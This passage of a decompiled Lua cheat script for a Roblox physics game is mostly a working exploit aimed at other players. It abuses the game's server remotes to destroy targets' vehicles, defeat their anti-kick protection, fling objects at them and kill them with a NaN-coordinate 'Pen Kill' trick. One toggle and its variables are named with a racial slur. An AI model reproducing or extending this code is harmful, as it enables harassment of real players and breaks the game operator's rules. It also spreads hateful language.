                                return
                            end
                            local v59 = nil

                            local connection2 = lastHouse.ChildAdded:Connect(function(child)
                                if child.Name == "CreatureBlobman" then
                                    v59 = child
                                end
                            end)

                            task.spawn(function()
                                pcall(function()
                                    fn4("CreatureBlobman", humanoidRootPart2.CFrame * CFrame.new(0, 14, 20), Vector3.zero)
                                end)
                            end)

                            local now2 = tick()

                            repeat
                                task.wait()
                            until v59 or tick() - now2 > 2.5

                            connection2:Disconnect()
                            v57 = v59
                        end

                        if v57 then
                            local pivot = v46:GetPivot()
                            humanoidRootPart.Massless = false
                            local vehicleSeat2 = fn3(v57, "VehicleSeat")

                            if vehicleSeat2 then
                                vehicleSeat2:Sit(v47)
                                local now2 = tick()

                                while not v47.SeatPart and tick() - now2 < 3 do
                                    task.wait()
                                end

                                if v47.SeatPart then
                                    local blobmanSeatAndOwnerScript = fn3(v57, "BlobmanSeatAndOwnerScript")
                                    local creatureGrab = fn3(blobmanSeatAndOwnerScript, "CreatureGrab")
                                    local creatureRelease = fn3(blobmanSeatAndOwnerScript, "CreatureRelease")
                                    local rightDetector = fn3(v57, "RightDetector")
                                    local rightWeld = rightDetector and fn3(rightDetector, "RightWeld")
                                    v57:PivotTo(humanoidRootPart.CFrame)
                                    task.wait(0.15)
                                    local n2 = 0
                                    local v58 = v51
                                    local v59 = v52
                                    local v60 = v53

                                    while true do
                                        local n3 = n2 + 1
                                        if n3 > 15 then
                                            break
                                        end
                                        creatureGrab:FireServer(rightDetector, humanoidRootPart, rightWeld)
                                        creatureRelease:FireServer(rightWeld, humanoidRootPart)
                                        humanoidRootPart.Massless = false

                                        for i = 1, 10 do
                                            humanoid.Sit = true
                                        end

                                        n2 = n3
                                        task.wait()
                                    end

                                    v51 = v58
                                    v52 = v59
                                    v53 = v60
                                    v46:PivotTo(pivot)
                                end
                            end
                        end
                    end
                end
            end,
        })

        v18:AddButton({
            Text = "Destroy Gucci[Jump/Sit]",
            Func = function()
                local v46, v47 = getLocalCharAndHum()
                if not v46 or not v47 then
                    return
                end
                local playerList = tbl2.PlayerList
                local tbl11 = playerList or {}

                if type(tbl11) == "string" then
                    tbl11 = {tbl11}
                end

                local pivot = v46:GetPivot()
                local v48, v49, v50 = ipairs(tbl11)
                local v51 = v50
                local v52 = v48
                local v53 = v49

                while true do
                    local v54, v55 = v52(v53, v51)
                    if v54 == nil then
                        break
                    end
                    local v56 = v54
                    local tbl12 = {}
                    local v57 = workspace:FindFirstChild(v55 .. "SpawnedInToys")

                    if v57 then
                        for k, child in pairs(v57:GetChildren()) do
                            if child.Name == "CreatureBlobman" or child.Name:sub(1, 7) == "Tractor" then
                                table.insert(tbl12, child)
                            end
                        end

                        v56 = v54
                    end

                    local v58, v59, v60 = pairs(workspace.Plots:GetChildren())
                    local v61 = v60
                    local v62 = v58
                    local v63 = v59
                    local v64 = v56
                    local v65 = v52
                    local v66 = v53

                    while true do
                        local v67, v68 = v62(v63, v61)
                        if v67 == nil then
                            break
                        end
                        local v69, v70, v71 = pairs(v68.PlotSign.ThisPlotsOwners:GetChildren())
                        local v72 = v71
                        local v73 = v69
                        local v74 = v70
                        local v75 = v67
                        local v76 = v62
                        local v77 = v63
                        local v78 = v64
                        local v79 = v65
                        local v80 = v66

                        while true do
                            local v81, v82 = v73(v74, v72)
                            if v81 == nil then
                                break
                            end
                            v72 = v81

                            if v82.Value == v55 then
                                local v83 = workspace.PlotItems:FindFirstChild(v68.Name)

                                if v83 then
                                    for k, child in pairs(v83:GetChildren()) do
                                        if child.Name == "CreatureBlobman" or child.Name:sub(1, 7) == "Tractor" then
                                            table.insert(tbl12, child)
                                        end
                                    end

                                    v72 = v81
                                end
                            end
                        end

                        v61 = v75
                        v62 = v76
                        v63 = v77
                        v64 = v78
                        v65 = v79
                        v66 = v80
                    end

                    local v67, v68, v69 = pairs(tbl12)
                    local v70 = v69
                    local v71 = v67
                    local v72 = v68
                    local v73 = v64
                    local v74 = v65
                    local v75 = v66

                    while true do
                        local v76, v77 = v71(v72, v70)
                        if v76 == nil then
                            break
                        end

                        for i = 1, 2 do
                            local vehicleSeat = v77:FindFirstChild("VehicleSeat")
                            if not vehicleSeat then
                                break
                            end
                            vehicleSeat:Sit(v47)
                            local now2 = tick()

                            while not vehicleSeat.Occupant and tick() - now2 < 2 do
                                task.wait()
                            end

                            v46:PivotTo(pivot)
                            v47:ChangeState(Enum.HumanoidStateType.Jumping)
                            local primaryPart = v46.PrimaryPart
                            local v78 = primaryPart or v46

                            if v78:IsA("BasePart") then
                                v78.AssemblyLinearVelocity = Vector3.zero
                                v78.AssemblyAngularVelocity = Vector3.zero
                            end

                            task.wait(0.1)
                        end

                        v70 = v76
                        local primaryPart = v46.PrimaryPart
                        local v78 = primaryPart or v46

                        if v78:IsA("BasePart") then
                            v78.AssemblyLinearVelocity = Vector3.zero
                            v78.AssemblyAngularVelocity = Vector3.zero
                        end

                        v46:PivotTo(pivot)
                    end

                    v51 = v73
                    v52 = v74
                    v53 = v75
                end
            end,
        })

        v19:AddToggle("RemoveWdantikick", {
            Text = "Remove Anti-Kick [WD]",
            Default = false,
            Callback = function(tarAntiAntikickWD)
                tbl2.TarAntiAntikickWD = tarAntiAntikickWD

                if tarAntiAntikickWD then
                    local sprayCanWD = v8:FindFirstChild("SprayCanWD")

                    if sprayCanWD then
                        sprayCanWD:FindFirstChild("SoundPart")
                    end

                    local playerList = tbl2.PlayerList
                    local v46 = playerList and tbl2.PlayerList[1]
                    local humanoidRootPart = v46 and obj.Players:FindFirstChild(v46) and obj.Players:FindFirstChild(v46).Character and obj.Players:FindFirstChild(v46).Character:FindFirstChild("HumanoidRootPart")
                    tbl2.TarAntikickRoot = humanoidRootPart

                    if not sprayCanWD then
                        sprayCanWD = fn4("SprayCanWD", CFrame.new(0, 5, 0))

                        repeat
                            task.wait()
                        until sprayCanWD and sprayCanWD:FindFirstChild("SoundPart") or not tbl2.TarAntiAntikickWD

                        if not sprayCanWD:FindFirstChild("SoundPart") then
                            sprayCanWD:WaitForChild("SoundPart", 3)
                        end

                        if sprayCanWD then
                            for k, child in pairs(sprayCanWD:GetChildren()) do
                                if child:IsA("BasePart") and child.Name ~= "GrabParts" then
                                    child.CanCollide = false
                                end
                            end
                        end

                        task.delay(1, function()
                            if not sprayCanWD then
                                return
                            end
                            local name = sprayCanWD.Name
                            local name2 = sprayCanWD.Name
                            local v47 = nil

                            for k, child in pairs(v8:GetChildren()) do
                                if child.Name == name then
                                    v47 = k
                                end
                            end

                            if v47 == nil then
                                return
                            end

                            for i, child in ipairs(localPlayer.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents:GetChildren()) do
                                if child.Name == name2 and i == v47 then
                                    local viewItemButton = child.ViewItemButton
                                    viewItemButton.Text = "Anti-AntiKick"
                                    viewItemButton.TextScaled = true
                                    viewItemButton.LowResImage.Image = ""
                                end
                            end
                        end)
                    end

                    local hitbox = fn3(sprayCanWD, "Hitbox")

                    repeat
                        if hitbox then
                            SetNetworkOwner:FireServer(hitbox, hitbox.CFrame)
                        end

                        task.wait(0.05)
                    until not hitbox.Parent or not tbl2.TarAntiAntikickWD or hitbox:FindFirstChild("PartOwner")

                    while tbl2.TarAntiAntikickWD and task.wait(0.2) do
                        local soundPart = sprayCanWD and sprayCanWD.Parent and sprayCanWD:FindFirstChild("SoundPart")
                        local v47 = soundPart
                        local playerList2 = tbl2.PlayerList
                        local v48 = playerList2 and tbl2.PlayerList[1]
                        local v49 = v48
                        local humanoidRootPart2 = v48 and obj.Players:FindFirstChild(v49) and obj.Players:FindFirstChild(v49).Character and obj.Players:FindFirstChild(v49).Character:FindFirstChild("HumanoidRootPart")
                        tbl2.TarAntikickRoot = humanoidRootPart2

                        if not tbl2.TarAntikickRoot then
                            local playerList3, v50, v51, humanoidRootPart3

                            repeat
                                playerList3 = tbl2.PlayerList
                                v50 = playerList3 and tbl2.PlayerList[1]
                                v51 = v50
                                humanoidRootPart3 = v50 and obj.Players:FindFirstChild(v51) and obj.Players:FindFirstChild(v51).Character and obj.Players:FindFirstChild(v51).Character:FindFirstChild("HumanoidRootPart")
                                tbl2.TarAntikickRoot = humanoidRootPart3
                                task.wait(0.1)
                            until tbl2.TarAntikickRoot or not tbl2.TarAntiAntikickWD
                        end

                        if not v47 then
                            sprayCanWD = fn4("SprayCanWD", CFrame.new(0, 5, 0))

                            repeat
                                task.wait()
                            until sprayCanWD and sprayCanWD:FindFirstChild("SoundPart") or not tbl2.TarAntiAntikickWD

                            local soundPart2 = sprayCanWD:FindFirstChild("SoundPart")
                            local soundPart3 = soundPart2 or sprayCanWD:WaitForChild("SoundPart", 3)
                            v47 = soundPart3

                            if sprayCanWD then
                                for k, child in pairs(sprayCanWD:GetChildren()) do
                                    if child:IsA("BasePart") and child.Name ~= "GrabParts" then
                                        child.CanCollide = false
                                    end
                                end
                            end

                            local hitbox2 = fn3(sprayCanWD, "Hitbox")

                            repeat
                                if hitbox2 then
                                    SetNetworkOwner:FireServer(hitbox2, hitbox2.CFrame)
                                end

                                task.wait(0.05)
                            until not hitbox2.Parent or hitbox2:FindFirstChild("PartOwner") or not tbl2.TarAntiAntikickWD

                            task.delay(1, function()
                                if not sprayCanWD then
                                    return
                                end
                                local name = sprayCanWD.Name
                                local name2 = sprayCanWD.Name
                                local v50 = nil

                                for k, child in pairs(v8:GetChildren()) do
                                    if child.Name == name then
                                        v50 = k
                                    end
                                end

                                if v50 == nil then
                                    return
                                end

                                for i, child in ipairs(localPlayer.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents:GetChildren()) do
                                    if child.Name == name2 and i == v50 then
                                        local viewItemButton = child.ViewItemButton
                                        viewItemButton.Text = "Anti-Antikick"
                                        viewItemButton.TextScaled = true
                                        viewItemButton.LowResImage.Image = ""
                                    end
                                end
                            end)
                        end

                        v47.CFrame = tbl2.TarAntikickRoot.CFrame * CFrame.new(0, 0, 4)
                        task.wait()
                        v47.CFrame = CFrame.new(-382.838318, 41.6491699, 665.570251)
                        v47.AssemblyAngularVelocity = Vector3.zero
                        v47.AssemblyLinearVelocity = Vector3.zero
                    end
                end
            end,
        })

        loop:AddToggle("FireT", {
            Text = "Loop Fire",
            Default = false,
            Callback = function(fireLoop)
                tbl2.FireLoop = fireLoop

                if fireLoop then
                    task.spawn(function()
                        while tbl2.FireLoop do
                            fn4("Campfire", hrp_().CFrame * CFrame.new(0, 3, 4), Vector3.zero)
                            local v46 = obj.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
                            local campfire = v46:WaitForChild("Campfire", 3)
                            if not campfire or not tbl2.FireLoop then
                                break
                            end
                            campfire.Name = "CampLoop"
                            task.wait(0.1)

                            if campfire:FindFirstChild("SoundPart") then
                                SetNetworkOwner:FireServer(campfire.SoundPart, hrp_().CFrame)
                            end

                            local function fn40(arg, arg2)
                                return Vector3.new(math.random(arg, arg2), math.random(arg, arg2), math.random(arg, arg2))
                            end

                            while tbl2.FireLoop and campfire and campfire.Parent == v46 do
                                local v47 = ipairs
                                local playerList = tbl2.PlayerList
                                local tbl11 = playerList or {}

                                for k, v48 in v47(tbl11) do
                                    if not tbl2.FireLoop or not campfire or campfire.Parent ~= v46 then
                                        break
                                    end
                                    local v49 = obj.Players:FindFirstChild(v48)

                                    if v49 and v49 ~= localPlayer then
                                        local character = v49.Character

                                        if character then
                                            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                                            if humanoidRootPart then
                                                if campfire and campfire:FindFirstChild("SoundPart") then
                                                    local soundPart = campfire.SoundPart
                                                    local cframe = CFrame.new(0, 0, 3)
                                                    soundPart.CFrame = humanoidRootPart.CFrame * cframe
                                                    soundPart.AssemblyLinearVelocity = fn40(-100, 130)
                                                    soundPart.AssemblyAngularVelocity = fn40(-500, 500)
                                                end

                                                task.wait(0.1)
                                            end
                                        end
                                    end
                                end

                                task.wait(0.05)
                            end

                            if not tbl2.FireLoop then
                                if campfire and campfire.Name == "CampLoop" then
                                    DestroyToy:FireServer(campfire)
                                end

                                break
                            end

                            continue
                        end
                    end)
                end
            end,
        })

        loop:AddToggle("BananaT", {
            Text = "Loop Banana",
            Default = false,
            Callback = function(bananaLoop)
                local v46 = getCharacter()
                tbl2.BananaLoop = bananaLoop

                if bananaLoop then
                    task.spawn(function()
                        local foodBanana = nil
                        local v47 = nil

                        local function fn40(arg, arg2)
                            return Vector3.new(math.random(arg, arg2), math.random(arg, arg2), math.random(arg, arg2))
                        end

                        while tbl2.BananaLoop do
                            task.wait(0.05)
                            local tbl11 = {}
                            local v48 = ipairs
                            local playerList = tbl2.PlayerList
                            local tbl12 = playerList or {}

                            for k, v49 in v48(tbl12) do
                                local v50 = obj.Players:FindFirstChild(v49)

                                if v50 and v50 ~= localPlayer and not fn9(v50) and not fn6(v50) and v50.Character and v50.Character:FindFirstChild("Left Leg") then
                                    table.insert(tbl11, v50)
                                end
                            end

                            if #tbl11 == 0 then
                                task.wait(0.5)
                                continue
                            end
                            local leftLeg = tbl11[math.random(1, #tbl11)].Character:FindFirstChild("Left Leg")
                            local leftFootAttachment = leftLeg and leftLeg:FindFirstChild("LeftFootAttachment")

                            if leftFootAttachment then
                                if foodBanana and not foodBanana.Parent then
                                    foodBanana = nil
                                else
                                    foodBanana = SpawnedInToys:FindFirstChild("FoodBanana")
                                end

                                local soundPart = foodBanana and foodBanana:FindFirstChild("SoundPart")
                                local v49 = soundPart

                                if not soundPart then
                                    for k, child in pairs(SpawnedInToys:GetChildren()) do
                                        if child.Name == "FoodBanana" then
                                            DestroyToy:FireServer(child)
                                        end
                                    end

                                    if InPlot.Value and not InOwnedPlot.Value then
                                        InPlot:GetPropertyChangedSignal("Value"):Wait()
                                    end

                                    if not CanSpawnToy.Value then
                                        CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                                    end

                                    local n2 = hrp_().CFrame * CFrame.new(0, 14, 20)
                                    local value = InOwnedPlot.Value
                                    local lastHouse = value and tbl2.LastHouse or SpawnedInToys

                                    if lastHouse then
                                        local v50 = nil

                                        local connection2 = lastHouse.ChildAdded:Connect(function(child)
                                            if child.Name == "FoodBanana" then
                                                v50 = child
                                            end
                                        end)

                                        pcall(function()
                                            fn4("FoodBanana", n2, Vector3.zero)
                                        end)

                                        local now2 = tick()

                                        repeat
                                            task.wait()
                                        until v50 or tick() - now2 > 1.5

                                        connection2:Disconnect()
                                        foodBanana = v50
                                    end

                                    if not foodBanana then
                                        continue
                                    end
                                    local soundPart2 = foodBanana:FindFirstChild("SoundPart")
                                    local soundPart3 = soundPart2 or foodBanana:WaitForChild("SoundPart", 2)
                                    if not soundPart3 then
                                        continue
                                    end
                                    local holdPart = foodBanana:FindFirstChild("HoldPart")
                                    local holdPart2 = holdPart or foodBanana:WaitForChild("HoldPart", 2)

                                    if holdPart2 then
                                        local holdItemRemoteFunction = holdPart2:FindFirstChild("HoldItemRemoteFunction")
                                        local holdItemRemoteFunction2 = holdItemRemoteFunction or holdPart2:WaitForChild("HoldItemRemoteFunction")

                                        if holdItemRemoteFunction2 then
                                            holdItemRemoteFunction2:InvokeServer(foodBanana, v46)
                                        end
                                    end

                                    UseRemote:FireServer(foodBanana)

                                    while tbl2.BananaLoop and foodBanana:FindFirstChild("EdiblePart") ~= nil do
                                        task.wait()
                                    end

                                    if not tbl2.BananaLoop then
                                        break
                                    end
                                    UseRemote:FireServer(foodBanana)

                                    if holdPart2 then
                                        local dropItemRemoteFunction = holdPart2:FindFirstChild("DropItemRemoteFunction")
                                        local dropItemRemoteFunction2 = dropItemRemoteFunction or holdPart2:WaitForChild("DropItemRemoteFunction")

                                        if dropItemRemoteFunction2 then
                                            dropItemRemoteFunction2:InvokeServer(foodBanana, v46:GetPivot() * CFrame.new(0, 15, -10), Vector3.zero)
                                        end
                                    end

                                    local soundPart4

                                    repeat
                                        soundPart4 = foodBanana and foodBanana:FindFirstChild("SoundPart")
                                        v49 = soundPart4
                                        if not soundPart4 then
                                            break
                                        end
                                        SetNetworkOwner:FireServer(v49, v49.CFrame)
                                        task.wait()
                                    until not tbl2.BananaLoop or not v49 or v49:FindFirstChild("PartOwner") ~= nil

                                    if not tbl2.BananaLoop then
                                        break
                                    end
                                    DestroyGrabLine:FireServer(v49)
                                    local attachment = Instance.new("Attachment")
                                    attachment.Parent = v49
                                    local alignPosition = Instance.new("AlignPosition")
                                    v47 = alignPosition
                                    alignPosition.MaxForce = math.huge
                                    alignPosition.MaxVelocity = math.huge
                                    alignPosition.Responsiveness = 200
                                    alignPosition.Parent = v49
                                    alignPosition.Attachment0 = attachment
                                end

                                local flag = true

                                for k, child in pairs(foodBanana:GetChildren()) do
                                    if child:FindFirstChild("PartOwner") ~= nil and child.PartOwner.Value ~= localPlayer.Name then
                                        DestroyToy:FireServer(foodBanana)
                                        foodBanana = nil
                                        flag = false
                                        break
                                    end
                                end

                                if flag and foodBanana then
                                    local alignPosition = v49:FindFirstChild("AlignPosition")
                                    v47 = alignPosition

                                    if alignPosition then
                                        alignPosition.Attachment1 = leftFootAttachment
                                        v49.AssemblyLinearVelocity = fn40(-100, 130)
                                        v49.AssemblyAngularVelocity = fn40(-500, 500)
                                        task.wait(0.3)
                                    else
                                        DestroyToy:FireServer(foodBanana)
                                        foodBanana = nil
                                    end
                                end
                            end
                        end

                        if foodBanana then
                            if v47 then
                                v47:Destroy()
                            end

                            DestroyToy:FireServer(foodBanana)
                        end
                    end)
                else
                    for k, child in pairs(SpawnedInToys:GetChildren()) do
                        if child.Name == "FoodBanana" then
                            DestroyToy:FireServer(child)
                        end
                    end
                end
            end,
        })

        loop:AddToggle("LoopdarkT", {
            Text = "Loop Nigger",
            Default = false,
            Callback = function(niggerLoop)
                tbl2.niggerLoop = niggerLoop

                if niggerLoop then
                    task.spawn(function()
                        while tbl2.niggerLoop do
                            fn4("OvenDarkGray", hrp_().CFrame * CFrame.new(0, 3, 4), Vector3.zero)
                            local v46 = obj.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
                            local ovenDarkGray = v46:WaitForChild("OvenDarkGray", 3)
                            if not ovenDarkGray or not tbl2.niggerLoop then
                                break
                            end
                            ovenDarkGray.Name = "BurnOvenDarkGray"
                            local buttonOven = ovenDarkGray:FindFirstChild("ButtonOven")

                            if buttonOven then
                                SetNetworkOwner:FireServer(buttonOven, hrp_().CFrame)
                                DestroyGrabLine:FireServer(buttonOven)
                            end

                            task.wait(0.1)

                            if ovenDarkGray:FindFirstChild("SoundPart") then
                                SetNetworkOwner:FireServer(ovenDarkGray.SoundPart, hrp_().CFrame)
                            end

                            local function fn40(arg, arg2)
                                return Vector3.new(math.random(arg, arg2), math.random(arg, arg2), math.random(arg, arg2))
                            end

                            while tbl2.niggerLoop and ovenDarkGray and ovenDarkGray.Parent == v46 do
                                local v47 = ipairs
                                local playerList = tbl2.PlayerList
                                local tbl11 = playerList or {}

                                for k, v48 in v47(tbl11) do
                                    if not tbl2.niggerLoop or not ovenDarkGray or ovenDarkGray.Parent ~= v46 then
                                        break
                                    end
                                    local v49 = obj.Players:FindFirstChild(v48)

                                    if v49 and v49 ~= localPlayer then
                                        local character = v49.Character

                                        if character then
                                            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                                            if humanoidRootPart then
                                                if ovenDarkGray and ovenDarkGray:FindFirstChild("SoundPart") then
                                                    local soundPart = ovenDarkGray.SoundPart
                                                    local cframe = CFrame.new(0, 0, 3)
                                                    soundPart.CFrame = humanoidRootPart.CFrame * cframe
                                                    soundPart.AssemblyLinearVelocity = fn40(-100, 130)
                                                    soundPart.AssemblyAngularVelocity = fn40(-500, 500)
                                                end

                                                task.wait(0.1)
                                            end
                                        end
                                    end
                                end

                                task.wait(0.05)
                            end

                            if not tbl2.niggerLoop then
                                if ovenDarkGray and ovenDarkGray.Name == "BurnOvenDarkGray" then
                                    DestroyToy:FireServer(ovenDarkGray)
                                end

                                break
                            end

                            continue
                        end
                    end)
                end
            end,
        })

        Fling:AddButton({
            Text = "Decoy Fling",
            Callback = function()
                local YouDecoy = fn4("YouDecoy", CFrame.new(3, 4, 0))
                if not YouDecoy then
                    return
                end
                YouDecoy.Name = "FLINGDECOY"

                while YouDecoy:FindFirstChild("HumanoidRootPart") == nil or YouDecoy:FindFirstChild("Torso") == nil do
                    task.wait()
                end

                local humanoidRootPart = fn3(YouDecoy, "HumanoidRootPart")
                local head_ = fn3(YouDecoy, "Head")

                repeat
                    if humanoidRootPart then
                        SetNetworkOwner:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
                    end

                    task.wait(0.05)
                until not humanoidRootPart.Parent or YouDecoy:WaitForChild("Head"):FindFirstChild("PartOwner")

                local playerList = tbl2.PlayerList
                local v46 = playerList and tbl2.PlayerList[1]
                local v47 = v46 and obj.Players:FindFirstChild(v46)
                if not v47 or not v47.Character or not v47.Character:FindFirstChild("HumanoidRootPart") then
                    return
                end
                local humanoidRootPart2 = v47.Character.HumanoidRootPart

                task.spawn(function()
                    while YouDecoy and YouDecoy.Parent and v47 and v47.Character and task.wait() do
                        humanoidRootPart.CFrame = humanoidRootPart2.CFrame
                        head_.CFrame = humanoidRootPart2.CFrame * CFrame.new(0, 1.5, 0)

                        if YouDecoy:FindFirstChild("Torso") then
                            YouDecoy.Torso.CFrame = humanoidRootPart2.CFrame
                        end

                        humanoidRootPart.AssemblyLinearVelocity = Vector3.new(math.random(-50, 50), math.random(100, 200), math.random(-50, 50))
                        humanoidRootPart.AssemblyAngularVelocity = Vector3.new(math.random(-200, 200) * 100, math.random(-200, 200) * 100, math.random(-200, 200) * 100)
                    end
                end)
            end,
        })

        Grab:AddToggle("PenKill", {
            Text = "Pen Kill",
            Default = false,
            Callback = function(penKillT)
                tbl2.PenKillT = penKillT

                if penKillT then
                    local playerList = tbl2.PlayerList
                    local v46 = playerList and tbl2.PlayerList[1]

                    if not v46 or v46 == "" then
                        task.spawn(function()
                            if toggles and toggles.PenKill then
                                toggles.PenKill:SetValue(false)
                            end
                        end)

                        return
                    end

                    local v47 = obj.Players:FindFirstChild(v46)

                    if v47 then
                        if tbl2.PenKillRespawnConn then
                            tbl2.PenKillRespawnConn:Disconnect()
                            tbl2.PenKillRespawnConn = nil
                        end

                        tbl2.PenKillRespawnConn = v47.CharacterAdded:Connect(function()
                            if tbl2.PenKillT then
                                task.wait(0.2)

                                task.spawn(function()
                                    local playerList2 = tbl2.PlayerList
                                    local v48 = playerList2 and tbl2.PlayerList[1]
                                    if not v48 or v48 == "" then
                                        return
                                    end
                                    local v49 = obj.Players:FindFirstChild(v48)
                                    if not v49 or not v49.Character then
                                        return
                                    end
                                    local head_ = v49.Character:FindFirstChild("Head")
                                    if not head_ then
                                        return
                                    end
                                    local v50 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                                    if v50 then
                                        local menuToys2 = obj.ReplicatedStorage:FindFirstChild("MenuToys")
                                        local destroyToy2 = menuToys2 and obj.ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")

                                        if destroyToy2 then
                                            for k, child in pairs(v50:GetChildren()) do
                                                if child.Name == "ToolPencil" then
                                                    pcall(function()
                                                        destroyToy2:FireServer(child)
                                                    end)
                                                end
                                            end
                                        end
                                    end

                                    task.wait(0.05)
                                    local character = localPlayer.Character
                                    local humanoidRootPart = character and localPlayer.Character:FindFirstChild("HumanoidRootPart") or hrp_ and hrp_()
                                    if not humanoidRootPart then
                                        return
                                    end
                                    local n2 = humanoidRootPart.CFrame * CFrame.new(0, 14, 20)
                                    local menuToys2 = obj.ReplicatedStorage:FindFirstChild("MenuToys")
                                    if not menuToys2 then
                                        return
                                    end
                                    local spawnToyRemoteFunction2 = menuToys2:FindFirstChild("SpawnToyRemoteFunction")
                                    if not spawnToyRemoteFunction2 then
                                        return
                                    end
                                    local v51 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                                    if not v51 then
                                        return
                                    end
                                    local v52 = nil

                                    local connection2 = v51.ChildAdded:Connect(function(child)
                                        if child.Name == "ToolPencil" then
                                            v52 = child
                                            conn:Disconnect()
                                        end
                                    end)

                                    task.spawn(function()
                                        pcall(function()
                                            spawnToyRemoteFunction2:InvokeServer("ToolPencil", n2, Vector3.zero)
                                        end)
                                    end)

                                    local now2 = tick()

                                    repeat
                                        task.wait(0.05)
                                    until v52 or tick() - now2 > 3

                                    if connection2 then
                                        pcall(function()
                                            connection2:Disconnect()
                                        end)
                                    end

                                    if not v52 then
                                        return
                                    end
                                    local soundPart = v52:FindFirstChild("SoundPart")
                                    local stickyPart = v52:FindFirstChild("StickyPart")

                                    if soundPart then
                                        local grabEvents = obj.ReplicatedStorage:FindFirstChild("GrabEvents")

                                        if grabEvents then
                                            local setNetworkOwner2 = grabEvents:FindFirstChild("SetNetworkOwner")

                                            if setNetworkOwner2 then
                                                pcall(function()
                                                    for i = 1, 5 do
                                                        setNetworkOwner2:FireServer(soundPart, soundPart.CFrame)
                                                    end
                                                end)
                                            end
                                        end
                                    end

                                    task.wait(0.05)

                                    if stickyPart then
                                        local playerEvents = obj.ReplicatedStorage:FindFirstChild("PlayerEvents")
                                        local stickyPartEvent2 = playerEvents and obj.ReplicatedStorage.PlayerEvents:FindFirstChild("StickyPartEvent")

                                        if stickyPartEvent2 then
                                            pcall(function()
                                                stickyPartEvent2:FireServer(stickyPart, head_, CFrame.new(0, (0 / 0), 0))
                                                stickyPartEvent2:FireServer(stickyPart, head_, CFrame.new(0, (0 / 0), 0))
                                            end)
                                        end
                                    end
                                end)
                            end
                        end)
                    end

                    if tbl2.PenKillTask then
                        task.cancel(tbl2.PenKillTask)
                    end

                    tbl2.PenKillTask = task.spawn(function()
                        while tbl2.PenKillT do
                            local v48 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                            local n2 = 0

                            if v48 then
                                for k, child in pairs(v48:GetChildren()) do
                                    if child.Name == "ToolPencil" then
                                        n2 = n2 + 1
                                    end
                                end
                            end

                            local flag = false

                            if v48 then
                                local playerList2 = tbl2.PlayerList
                                local v49 = playerList2 and tbl2.PlayerList[1]

                                if v49 then
                                    local v50 = obj.Players:FindFirstChild(v49)

                                    if v50 and v50.Character then
                                        local head_ = v50.Character:FindFirstChild("Head")

                                        if head_ then
                                            for k, child in pairs(v48:GetChildren()) do
                                                if child.Name == "ToolPencil" then
                                                    local stickyPart = child:FindFirstChild("StickyPart")
                                                    if not stickyPart then
                                                        continue
                                                    end
                                                    local stickyWeld = stickyPart:FindFirstChild("StickyWeld")
                                                    if stickyWeld and stickyWeld.Part1 == head_ then
                                                        flag = true
                                                        break
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end

                            if n2 == 0 or n2 >= 2 or n2 == 1 and not flag then
                                if v48 then
                                    local menuToys2 = obj.ReplicatedStorage:FindFirstChild("MenuToys")
                                    local destroyToy2 = menuToys2 and obj.ReplicatedStorage.MenuToys:FindFirstChild("DestroyToy")

                                    if destroyToy2 then
                                        for k, child in pairs(v48:GetChildren()) do
                                            if child.Name == "ToolPencil" then
                                                pcall(function()
                                                    destroyToy2:FireServer(child)
                                                end)
                                            end
                                        end
                                    end
                                end

                                task.wait(0.05)
                                local playerList2 = tbl2.PlayerList
                                local v49 = playerList2 and tbl2.PlayerList[1]

                                if v49 and v49 ~= "" then
                                    local v50 = obj.Players:FindFirstChild(v49)

                                    if v50 and v50.Character then
                                        local head_ = v50.Character:FindFirstChild("Head")
                                        local character = localPlayer.Character
                                        local humanoidRootPart = character and localPlayer.Character:FindFirstChild("HumanoidRootPart") or hrp_ and hrp_()

                                        if head_ and humanoidRootPart then
                                            local n3 = humanoidRootPart.CFrame * CFrame.new(0, 14, 20)
                                            local menuToys2 = obj.ReplicatedStorage:FindFirstChild("MenuToys")

                                            if menuToys2 then
                                                local spawnToyRemoteFunction2 = menuToys2:FindFirstChild("SpawnToyRemoteFunction")
                                                local v51 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

                                                if spawnToyRemoteFunction2 and v51 then
                                                    local v52 = nil

                                                    local connection2 = v51.ChildAdded:Connect(function(child)
                                                        if child.Name == "ToolPencil" then
                                                            v52 = child
                                                            conn:Disconnect()
                                                        end
                                                    end)

                                                    task.spawn(function()
                                                        pcall(function()
                                                            spawnToyRemoteFunction2:InvokeServer("ToolPencil", n3, Vector3.zero)
                                                        end)
                                                    end)

                                                    local now2 = tick()

                                                    repeat
                                                        task.wait(0.05)
                                                    until v52 or tick() - now2 > 3

                                                    if connection2 then
                                                        pcall(function()
                                                            connection2:Disconnect()
                                                        end)
                                                    end

                                                    if v52 then
                                                        local soundPart = v52:FindFirstChild("SoundPart")
                                                        local stickyPart = v52:FindFirstChild("StickyPart")

                                                        if soundPart then
                                                            local grabEvents = obj.ReplicatedStorage:FindFirstChild("GrabEvents")

                                                            if grabEvents then
                                                                local setNetworkOwner2 = grabEvents:FindFirstChild("SetNetworkOwner")

                                                                if setNetworkOwner2 then
                                                                    pcall(function()
                                                                        for i = 1, 5 do
                                                                            setNetworkOwner2:FireServer(soundPart, soundPart.CFrame)
                                                                        end
                                                                    end)
                                                                end
                                                            end
                                                        end

                                                        task.wait(0.05)

                                                        if stickyPart then
                                                            local playerEvents = obj.ReplicatedStorage:FindFirstChild("PlayerEvents")
                                                            local stickyPartEvent2 = playerEvents and obj.ReplicatedStorage.PlayerEvents:FindFirstChild("StickyPartEvent")

                                                            if stickyPartEvent2 then
                                                                pcall(function()
                                                                    stickyPartEvent2:FireServer(stickyPart, head_, CFrame.new(0, (0 / 0), 0))
                                                                    stickyPartEvent2:FireServer(stickyPart, head_, CFrame.new(0, (0 / 0), 0))
                                                                end)
                                                            end

                                                            task.wait(0.5)
                                                        end
                                                    end
                                                end
                                            end
                                        end
